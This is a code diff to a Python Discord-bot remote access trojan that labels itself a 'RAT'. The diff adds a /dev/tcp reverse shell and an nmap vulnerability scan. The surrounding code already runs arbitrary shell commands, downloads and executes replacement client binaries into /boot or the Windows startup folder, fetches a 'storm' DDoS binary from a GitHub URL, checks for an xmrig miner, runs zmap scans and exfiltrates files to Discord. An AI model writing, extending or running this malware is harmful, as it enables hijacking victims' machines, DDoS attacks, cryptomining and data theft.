@@ -2,7 +2,7 @@ from discord.ext import commands
 import requests, platform, discord, urllib, psutil, socket, sys, os
 
 token = 'MToken.mnt.discord' # Token
-channel_id = 111111111111111111  # Channel ID
+channel_id = 111111111111111 # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -43,66 +43,73 @@ async def check(ctx):
     if platform.system() == 'Linux':
         if "xmrig" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
-        
+            
         if "storm" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: DDoS running``")
-
+            
         if "zmap" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: ZMap running``")
+            
+        if "nmap" in (i.name() for i in psutil.process_iter()):
+            await ctx.send(f"``[+] {hostname}@{ip}: Nmap running``")
     else:
         if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
     
 # update linux
 @bot.command()
-async def updatelinux(ctx, LinuxLinkArg):
-    linux_link = ''.join(LinuxLinkArg)
+async def updatelinux(ctx, shUpdateLinkArg):
+    sh_update_link = ''.join(shUpdateLinkArg)
     if platform.system() == 'Linux':
         os.chdir("/boot")
         if os.path.exists("Client"):
             os.remove("Client")
-        
-        r = requests.get(LinuxLinkArg, allow_redirects=True)
+            
+        r = requests.get(shUpdateLinkArg, allow_redirects=True)
         open("Client", 'wb').write(r.content)
-        
+            
         if os.path.exists("Client"):
             os.popen("chmod 777 Client; ./Client")
             await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
             sys.exit()
         else:
+            await ctx.send(f"``[-] {hostname}@{ip}: RAT not updated``")
             os.chdir("/tmp")
     
 # update windows
 @bot.command()
-async def updatewindows(ctx, WindowsLinkArg):
-    windows_link = ''.join(WindowsLinkArg)
+async def updatewin(ctx, winUpdateLinkArg):
+    win_update_link = ''.join(winUpdateLinkArg)
     if platform.system() == 'Windows':
         os.chdir(startup)
         if os.path.exists("Client.exe"):
             os.remove("Client.exe")
-        
-        r = requests.get(WindowsLinkArg, allow_redirects=True)
+            
+        r = requests.get(winUpdateLinkArg, allow_redirects=True)
         open("Client.exe", 'wb').write(r.content)
-        
+            
         if os.path.exists("Client.exe"):
             os.popen("Client.exe")
             await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
             sys.exit()
         else:
+            await ctx.send(f"``[-] {hostname}@{ip}: RAT not updated``")
             os.chdir(temp)
     
 # ddos
 @bot.command()
-async def ddos(ctx, ddosarg):
+async def ddos(ctx, ddosArg):
+    ddosip = ''.join(ddosArg)
     if platform.system() == 'Linux':
         if not os.path.exists("storm"):
             url = "https://github.com/rxu7s/Public/raw/main/storm"
             r = requests.get(url, allow_redirects=True)
             open("storm", 'wb').write(r.content)
             
-        ddosip = ''.join(ddosarg)
         os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
         await ctx.send(f"``[+] {hostname}@{ip}: DDoS started``")
+    else:
+        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
     
 # stop ddos
 @bot.command()
@@ -150,12 +157,15 @@ async def stopminer(ctx):
 async def zmap(ctx):
     if platform.system() == 'Linux':
         os.popen("apt-get install zmap -y")
-        p = os.popen(f"zmap -B 10M -p 22 {ip}/24 -o iplist.txt")
+        p = os.popen(f"zmap -B 10M -p 22 {ip}/24 -o {ip}-list.txt")
         await ctx.send(f"``[+] {hostname}@{ip}: ZMap started``")
-
+            
         if "zmapscan" not in p.read():
-            if os.path.exists("iplist.txt"):
-                await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File("iplist.txt"))
+            if os.path.exists(f"{ip}-list.txt"):
+                await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File(f"{ip}-list.txt"))
+    else:
+        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
+    
 
 # ----- Self Commands ----- #
 
@@ -174,22 +184,32 @@ async def shell(ctx, *args):
     arguments = ' '.join(args)
     stream = os.popen(arguments)
     output = stream.read()
-    
+        
     if sys.getsizeof(output) > 2000:
         await ctx.send(f"``[+] {hostname}@{ip}: Command executed``")
     else:
         await ctx.send(f"``[+] {hostname}@{ip}: Command executed`` ```sh\n{output}```")
     
+# reverse shell
+@bot.command(name=f"revshell.{hostname}@{ip}")
+async def revshell(ctx, revshellRipArg, revshellRportArg):
+    rip = ''.join(revshellRipArg)
+    rport = ''.join(revshellRportArg)
+    if platform.system() == 'Linux':
+        os.popen(f"cmd -i >& /dev/tcp/{rip}/{rport} 0>&1")
+    else:
+        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
+    
 # download
 @bot.command(name=f"download.{hostname}@{ip}")
-async def download(ctx, arg1, arg2):
-    link = ''.join(arg1)
-    name = ''.join(arg2)
-    
+async def download(ctx, downloadLinkArg, downloadNameArg):
+    link = ''.join(downloadLinkArg)
+    name = ''.join(downloadNameArg)
+        
     url = link
     r = requests.get(url, allow_redirects=True)
     open(name, 'wb').write(r.content)
-    
+        
     if os.path.exists(name):
         await ctx.send(f"``[+] {hostname}@{ip}: File downloaded``")
     else:
@@ -197,9 +217,25 @@ async def download(ctx, arg1, arg2):
     
 # upload
 @bot.command(name=f"upload.{hostname}@{ip}")
-async def upload(ctx, arg1):
-    path = ''.join(arg1)
+async def upload(ctx, uploadPathArg):
+    path = ''.join(uploadPathArg)
     await ctx.send(f"``[+] {hostname}@{ip}: File uploaded``",file=discord.File(path))
+    
+# nmap
+@bot.command(name=f"nmap.{hostname}@{ip}")
+async def nmap(ctx):
+    if platform.system() == 'Linux':
+        os.popen("apt-get install nmap -y")
+        p = os.popen(f"nmap --script vuln {ip} -oG {ip}-scan.txt")
+        await ctx.send(f"``[+] {hostname}@{ip}: Nmap started``")
+            
+        if "nmapscan" not in p.read():
+            if os.path.exists(f"{ip}-scan.txt"):
+                await ctx.send(f"``[+] {hostname}@{ip}: Nmap report``",file=discord.File(f"{ip}-scan.txt"))
+    else:
+        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
+    
+
     
 
 bot.run(token)
